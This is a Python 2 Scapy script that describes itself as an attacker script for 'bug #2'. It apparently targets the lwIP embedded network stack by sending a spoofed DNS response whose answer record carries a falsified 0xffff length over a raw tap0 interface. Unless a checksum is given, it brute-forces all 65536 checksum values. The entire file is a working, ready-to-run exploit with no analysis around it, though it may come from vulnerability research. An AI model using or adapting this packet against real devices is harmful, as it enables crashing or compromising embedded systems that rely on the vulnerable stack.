#!/usr/bin/python2
"""
This attacker script send packet(s) triggers bug #2
"""
from scapy.all import *
import sys

def usage():
    print "usage: %s dport [checksum]" % (sys.argv[0])
    exit(1)

if os.geteuid() != 0:
    exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")

if len(sys.argv) < 2:
    usage()
# LWIP_VER = sys.argv[1]
DPORT = int(sys.argv[1])
CHECKSUM = -1
if len(sys.argv) >= 3:
    CHECKSUM = int(sys.argv[2], 16)
    print "[*] checksum = %#x" % CHECKSUM

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind(("tap0", 0))

# sendp(Ether(dst="11:22:33:44:55:66")/IP(src="8.8.8.8", dst="192.168.0.2")/UDP(sport=53, dport=0x1000)/DNS(id=0, qdcount=1, ancount=0xffff, qr=1, aa=0, tc=0, rd=1, ra=1, z=0, rcode=0, an=DNSRR(rrname="www.google.com", type=1, rdata="127.0.0.1")), iface="tap0")

"""
if LWIP_VER in ["1.3"]:
    dport = 0x1000
elif LWIP_VER in ["1.4.0"]:
    dport = 49152
elif LWIP_VER in ["1.4.1", "2.0"]:
    dport = 49153
elif LWIP_VER in ["master"]:
    dport = 50536
"""
dport = DPORT
acount = 2 # requres at least 2 times loop iteration
# acount = 0xffff
b = bytes(Ether(dst="11:22:33:44:55:66")/IP(src="8.8.8.8", dst="192.168.0.2")/UDP(sport=53, dport=dport)/DNS(id=0, qdcount=1, ancount=acount, qr=1, aa=0, tc=0, rd=1, ra=1, z=0, rcode=0, qd=DNSQR(qname='www.google.com.', qtype=1, qclass=1), an=DNSRR(rrname="www.google.com.", type=1, rdata="127.0.0.1")))
b = b.replace('\x00\x04\x7f\x00\x00\x01', '\xff\xff\x7f\x00\x00\x01')

### patch TCP checksum & send packet
if CHECKSUM < 0:
    for checksum in range(256 * 256):
        print checksum
        b = b[:0x28] + struct.pack('!H', checksum) + b[0x28+2:]
        s.send(b) # bomb packet
else:
    b = b[:0x28] + struct.pack('!H', CHECKSUM) + b[0x28+2:]
    s.send(b) # bomb packet
